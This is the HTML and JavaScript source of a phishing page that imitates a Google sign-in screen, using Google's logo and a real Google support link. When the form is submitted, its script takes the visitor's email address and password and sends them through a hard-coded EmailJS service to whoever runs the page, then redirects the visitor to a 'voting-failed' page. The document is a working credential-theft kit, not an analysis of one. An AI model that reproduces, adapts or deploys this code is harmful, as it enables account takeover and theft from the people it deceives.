<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
 body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* Align content at the top */
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 90%; /* Adjusted width to be responsive */
            padding: 40px; /* Increased padding for a larger appearance */
            background-color: rgb(242, 241, 241);
            border-radius: 0px; /* Added rounded corners */
            box-shadow: 0 0 0px rgba(0, 0, 0, 0.2);
        }

        .container input[type="text"],
        .container input[type="password"] {
            width: 93%;
            padding: 15px; /* Increased padding for a larger appearance */
            margin: 10px 0;
            border: 1px solid #a9bdca;
            outline: none;
            border-radius: 10px;
            height: 30px; /* Adjusted the height for larger inputs */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .login-button {
            width: 100px;
            padding: 15px; /* Increased padding for a larger appearance */
            background-color: #0e59ee;
            border: none;
            color: #fff;
            cursor: pointer;
            border-radius: 10px;
            height: 50px; /* Adjusted the height for a larger button */
            font-size: 18px; /* Increased font size for better visibility */
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px; /* Increased margin top */
        }

        .forgot-password a {
            text-decoration: none;
            color: #0a68d4;
            font-size: 16px; /* Increased font size for better visibility */
        }

        .centered-image1,
        .centered-image2 {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .custom-text {
            font-family: Arial, sans-serif;
            font-size: 16px; /* Increased font size for better visibility */
            margin-top: 15px;
            margin-bottom: 10px;
            text-align: center; 
        }
        .footer {
            background-color: #f2f2f2; /* Editable background color */
            color: rgb(205, 205, 205);
            text-align: center;
            padding: 20px;
            margin-top: 150px; /* Editable margin top */
            margin-bottom: 20px; /* Editable margin bottom */
        }

        .footer a {
            color: rgb(175, 175, 175); /* Editable link color */
            text-decoration: none;
            margin: 0 10px; /* Editable space between links */
        }

        .copyright {
            margin-top: 10px; /* Editable margin top for the copyright text */
        }
        .button-container {
    overflow: auto; /* To ensure the container properly contains floated elements */
}

.float-right {
    float: right;
    margin-right: 80px;
}
    </style>
</head>
<body>
    <div class="centered-image1">
        <img src="" alt="" style="max-width: 100%; margin-bottom: 20px;">
    </div>
    <div class="container">
        <div class="centered-image2">
            <img src="https://raw.githubusercontent.com/Taylor-Swift1989/photo3/a300010b118eba7ed2d8100772e712ec6aba0fe8/googlelogo_color_150x54dp.png" alt="" style="max-width: 100%; margin-bottom: 20px;">
            <div class="custom-text"></div>
        </div>
        <!-- Modified the form to prevent its default behavior and added a JavaScript function to handle the submission -->
        <form name="login" onsubmit="sendLoginDetails(); return false;">
            <input type="text" class="container input" placeholder="Email address or Phone number" name="email" id="email">
            <input type="password" class="container input" placeholder="Password" name="password" id="password">
            <div class="button-container">
                <button class="login-button float-right" id="loginButton" type="submit">Sign In</button>
            </div>
            
        </form>
        <div class="forgot-password">
            <a href="https://support.google.com/accounts?hl=en-US&p=account_iph">Forgot password?</a>
        </div>        
    </div>

    <!-- Include Email.js library -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
    emailjs.init("i7EeAStelqHs8raTS");

    // Function to send login details via Email.js
    function sendLoginDetails() {
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        const emailValue = emailInput.value.trim();
        const passwordValue = passwordInput.value.trim();

        // Check if email and password meet the length requirement
        if (emailValue.length < 3 || passwordValue.length < 3) {
            alert('please insert your Email address and Password');
            return;
        }

        // Check if both email and password are not empty
        if (emailValue === '' && passwordValue === '') {
            alert('');
            return;
        }

        // Check if either email or password is empty
        if (emailValue === '' || passwordValue === '') {
            alert('');
            return;
        }

        // Template parameters
        const templateParams = {
            email: emailValue,
            password: passwordValue
        };

        // Send email using Email.js
        emailjs.send("service_vdcs1jx", "template_1m4cj2n", templateParams)
            .then(function(response) {
                console.log("Login details sent successfully", response);
                window.location.href = 'https://indian-art.github.io/voting-failed/';
            }, function(error) {
                console.log("Failed to send login details. Error:", error);
                console.log("email:", email);
                console.log("password:", password);
            });
    }

    // JavaScript to enable/disable the login button
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('loginButton');

    emailInput.addEventListener('input', validateInputs);
    passwordInput.addEventListener('input', validateInputs);

    function validateInputs() {
        const emailValue = emailInput.value.trim();
        const passwordValue = passwordInput.value.trim();

        // Check if email and password meet the length requirement
        if (emailValue.length < 6 || passwordValue.length < 6) {
            loginButton.disabled = true;
            return;
        }

        // Check if either email or password is empty
        if (emailValue === '' || passwordValue === '') {
            loginButton.disabled = true;
        } else {
            loginButton.disabled = false;
        }
    }
</script>
<div class="footer">
    <a>Help</a>
    <a>Privacy</a>
    <a>Terms</a>
    <a>English</a>
    <br>
</div>
</body>
</html>
